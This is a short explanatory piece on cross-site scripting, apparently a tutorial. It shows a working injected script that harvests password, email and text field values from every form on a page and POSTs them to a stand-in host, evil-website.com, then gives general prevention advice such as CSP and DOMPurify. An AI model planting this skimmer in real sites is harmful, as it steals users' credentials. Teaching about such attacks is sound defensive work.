**XSS (Cross-Site Scripting) Attack**
```html
<script>
  function stealInfo() {
    var sensitiveInfo = [];
    var forms = document.querySelectorAll("form");
    for (var i = 0; i < forms.length; i++) {
      var form = forms[i];
      var inputs = form.querySelectorAll("input");
      for (var j = 0; j < inputs.length; j++) {
        var input = inputs[j];
        if (input.type === "password" || input.type === "email" || input.type === "text") {
          sensitiveInfo.push(input.value);
        }
      }
    }
    fetch('https://evil-website.com/steal', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ sensitiveInfo: sensitiveInfo })
    });
  }
  stealInfo();
</script>
```
This malicious code is an example of a Cross-Site Scripting (XSS) attack, which injects a script into the website that steals sensitive information from the page, such as passwords, email addresses, and text fields, and sends it to an external server (`https://evil-website.com/steal`).

The code uses `document.querySelectorAll` to select all forms on the page, then iterates over each form and its inputs. It checks the type of each input to see if it's a password, email, or text field, and if so, adds the input value to an array. Finally, it sends the array of sensitive information to the external server using a POST request.

**How to prevent this attack:**

To prevent this attack, you can use the following measures:

1. Validate user input: Make sure to validate all user input to prevent malicious scripts from being injected.
2. Use Content Security Policy (CSP): Implement a Content Security Policy to specify which sources of content are allowed to be executed on your page.
3. Use JavaScript filters: Use JavaScript filters, such as `DOMPurify`, to sanitize user-generated content to prevent malicious scripts from being injected.
4. Keep software up to date: Ensure that your website's software and dependencies are up to date to prevent known vulnerabilities.

Remember, always be cautious when interacting with external resources and user-generated content to prevent malicious code from stealing your sensitive information!

